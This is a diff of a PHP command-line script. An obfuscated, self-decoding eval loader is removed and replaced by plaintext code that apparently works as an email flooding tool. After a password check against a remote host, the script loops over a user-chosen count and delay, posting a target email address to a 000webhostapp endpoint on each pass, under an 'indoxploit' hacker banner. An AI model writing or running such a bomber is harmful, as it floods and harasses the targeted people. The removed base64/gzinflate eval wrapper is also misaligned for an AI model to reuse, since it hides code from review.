@@ -1,1 +1,102 @@
-<?php /*** PHP Encode v1.0 by zeura.com ***/ $XnNhAWEnhoiqwciqpoHH=file(__FILE__);eval(base64_decode("aWYoIWZ1bmN0aW9uX2V4aXN0cygiWWl1bklVWTc2YkJodWhOWUlPOCIpKXtmdW5jdGlvbiBZaXVuSVVZNzZiQmh1aE5ZSU84KCRnLCRiPTApeyRhPWltcGxvZGUoIlxuIiwkZyk7JGQ9YXJyYXkoNjU1LDIzNiw0MCk7aWYoJGI9PTApICRmPXN1YnN0cigkYSwkZFswXSwkZFsxXSk7ZWxzZWlmKCRiPT0xKSAkZj1zdWJzdHIoJGEsJGRbMF0rJGRbMV0sJGRbMl0pO2Vsc2UgJGY9dHJpbShzdWJzdHIoJGEsJGRbMF0rJGRbMV0rJGRbMl0pKTtyZXR1cm4oJGYpO319"));eval(base64_decode(YiunIUY76bBhuhNYIO8($XnNhAWEnhoiqwciqpoHH)));eval(ZsldkfhGYU87iyihdfsow(YiunIUY76bBhuhNYIO8($XnNhAWEnhoiqwciqpoHH,2),YiunIUY76bBhuhNYIO8($XnNhAWEnhoiqwciqpoHH,1)));__halt_compiler();aWYoIWZ1bmN0aW9uX2V4aXN0cygiWnNsZGtmaEdZVTg3aXlpaGRmc293Iikpe2Z1bmN0aW9uIFpzbGRrZmhHWVU4N2l5aWhkZnNvdygkYSwkaCl7aWYoJGg9PXNoYTEoJGEpKXtyZXR1cm4oZ3ppbmZsYXRlKGJhc2U2NF9kZWNvZGUoJGEpKSk7fWVsc2V7ZWNobygiRXJyb3I6IEZpbGUgTW9kaWZpZWQiKTt9fX0=c25abeeaa566c277d37e0b29d2a1fd1fdcb8cd3fjVbbUiM3EH1mq/YfGseVmVlsjy/skgVMhSxs1SYEE9v7ZDtGjIWtoLmUpAkQ41S+JZ+WL0lLc7XxUoyrPFL36dMXSa2RVE0V8+mUM58pu+kcvX0DsEOFCMVU0CgUigXzXD4jik5n9JbEPLH7KwzoVFJlW6eSEfdnckeEIpaG78hHqahvWx6nRBiR/rnvYDA87Q/hU++i14d37ts3VUFltzJudjqjpl9BXHXBFPEz0VEnlZKbuJ0KW7kwihVbFNCDkrQETsWCzgpoK5eVgKlwLigNCmi7JC2BU/Ej5Ty8L9CdsrgET+U3PKYFeL8QlqD7WRoi4iXw+7K4BE/lfJ36Q0laAidiXIfzy7PSKiDylnBJoQuVpan1arTU1Vk9pNOJmbZXhlWJeANqqrPaK8BJuRJ4RAMVB/N1i6RCq93CJK1Z6oIpdrcZjlz998+/W33cxoGnWBiAIMEs9O0qp8FcLZCg1XRgqTcwQNVbEEE8RYVEhdVstTv77z8c/PDROnoGuMjspRLIZZdUToZOfA2UYCY5K6O5DQXYVYai5hHg+xjScPRsby+P5zlJo1uOYaR1drO2Ja46tJxJ6m6VvARVsQjWCRGx0qubl0dSZKxGoVTI+kc0dzCUHaTHWL1Y8CkLsBOYE2ymeLrDSOnka/Dpa/+idzWc4qsGlYVSkTx0XUnFn1R0Wu19LGaj2Wze05sF0pMoanih71ZeJuufD7/2L4f908vB5/N+DbN6EX7VGwxfBfr85fzibAC1CvUJ491Kw+TcqHw/J/4NEVqA2eNcxjfY/LoD84LfYioeSyHTB+ppcicpZF7GOxwwW+9IbIZOvr3Q5FkhtaYUKm4MPXu5nK2DVvPjlmIat41oEVW2MG8Sby0tZFvXRJ4Fq9NMA1sj9niIPWFdkW8zw5DUhXqLUJ/U9EDCzvTbD5b2GEQYqh8Z7tOHiIdMHf79Hfzya+fgyxmcoB7q3360GmCcHR+o5YNEk6tcO9M416kq041hjIFoDDxlqsyqDqi4rrsA1rrKdseuttSg8brKxR/AE1wb8nVdD38YgkFseruu/16vW9fHZrLuzp42HNChOJp/w6yB0bvG2YZGU+rHMopjPWwYMWbrgkl5nCmeuvj0HMfpdh0YY4B6fpJprZTMMt5q1mZaOt1ssKkplqCkSRbfxsR0vcb5XkgXD/3V6pnjnLpwiqEsiz3k5AB0MQ6WyZVvLoJkKwKMYJlefquTKWSIybadJ+NZiH8wDipHklMa2W3HXFuMM90YBSUzzgJqG1pkm8BI20wgIlLeh2JmOr5mPgRzMtktHprUvLvRLEz3N91oO/XzAF3Tw3SkCbvuXK+2Zf58FOCH2qRk73H2anvih3FgypTYSs6iVxvPKCePha322sLB/YJxapubUd93GI1uoc+upo3VzJrLIPY8KmW+puj6JyoWRDIOPt6OTDAf7mix/nnzzzl2dzNjvebo2qy6yS0JdG8vuzlXFD+L9CVZDkV/GMG5/k4uR3GV7Qa8gAkMCCcL8Ogd4OUdBJQXKSStLqHZDGX1Pw==
+<?php
+
+ 	set_time_limit(0);
+  	error_reporting(0);
+  	date_default_timezone_set('Asia/Jakarta');
+	system('clear');
+
+
+/* START COLOR */
+$res="\033[0m";
+$hitam="\033[0;30m";
+$abu2="\033[1;30m";
+$putih="\033[0;37m";
+$putih2="\033[1;37m";
+$red="\033[0;31m";
+$red2="\033[1;31m";
+$green="\033[0;32m";
+$green2="\033[1;32m";
+$yellow="\033[0;33m";
+$yellow2="\033[1;33m";
+$blue="\033[0;34m";
+$blue2="\033[1;34m";
+$purple="\033[0;35m";
+$purple2="\033[1;35m";
+$lblue="\033[0;36m";
+$lblue2="\033[1;36m";
+/* END COLOR */
+
+$false = "{$abu2}[{$red}x{$abu2}]{$red2}";
+$true = "{$abu2}[{$green}+{$abu2}]{$green2}";
+$pentung = "{$abu2}[{$yellow}!{$abu2}]{$yellow2}";
+$titik = "{$abu2}[{$res}•{$abu2}]{$green2}";
+function random($length = 10) {
+    $characters = '0123456789';
+    $charactersLength = strlen($characters);
+    $randomString = '';
+    for ($i = 0; $i < $length; $i++) {
+        $randomString .= $characters[rand(0, $charactersLength - 1)];
+    }
+    return $randomString;
+}
+
+function send($post, $jpg){
+	$ch = curl_init();
+	curl_setopt($ch, CURLOPT_URL, "https://server3124234.000webhostapp.com/");
+	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+	curl_setopt($ch, CURLOPT_POST, 1);
+	curl_setopt($ch, CURLOPT_POSTFIELDS ,"email=".$post."&gambar=".$jpg."&submit=Submit Query");
+	curl_exec($ch);
+}
+function kunci($result){
+    $curl = curl_init();
+    curl_setopt ($curl, CURLOPT_URL, "https://server17109.000webhostapp.com/kunci.php");
+    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
+ 
+    $result = curl_exec ($curl);
+    curl_close ($curl);
+    return $result;
+}
+echo "{$green2} 	___________________________
+	< root@indoxploit:~# KM37ID >
+	 ---------------------------
+	   \         ,        ,
+	    \       /(        )`
+	     \      \ \___   / |
+	            /- _  `-/  '
+	           (/\/ \ \   /\
+	           / /   | `    \
+	           O O   ) /    |
+	           `-^--'`<     '
+	          (_.)  _  )   /
+	           `.___/`    /
+	             `-----' /
+	<----.     __ / __   \
+	<----|====O)))==) \) /====>
+	<----'    `--' `.__,' \
+	             |        |
+	              \       /
+	        ______( (_  / \______
+	      ,'  ,-----'   |        \
+	      `--{__________)        \/
+\n{$putih}";
+echo "  [ {$lblue2}>_ {$putih}] root@indoxploit:~# sudo su \n";sleep(2);
+$pilih = readline("  [ >_ ] [sudo] password for root: ");
+if ($pilih == kunci($result)) {
+$post = readline("  [ >_ ] root@indoxploit:~#/email:~#  ");
+$jpg = readline("  [ >_ ] root@indoxploit:~#/img[none]:~#  ");
+$cli = readline("  [ >_ ] root@indoxploit:~#/amount:~# ");
+$slip = readline("  [ >_ ] root@indoxploit:~#/delay:~# ");
+$i = 1;
+while( $i <= $cli ){
+send($post, $jpg);
+echo "  [ {$green2} Success {$putih} ] Berhasil mengirim ke {$lblue2}".$post."{$green2}!!{$putih}\n";
+sleep($slip);
+$i++;
+}
+
+}else{
+	echo "  [ {$red} Error {$putih} ] Password anda Salah cek channel {$green2}KM37ID{$red}!!{$putih}\n";
+}
+
+?>
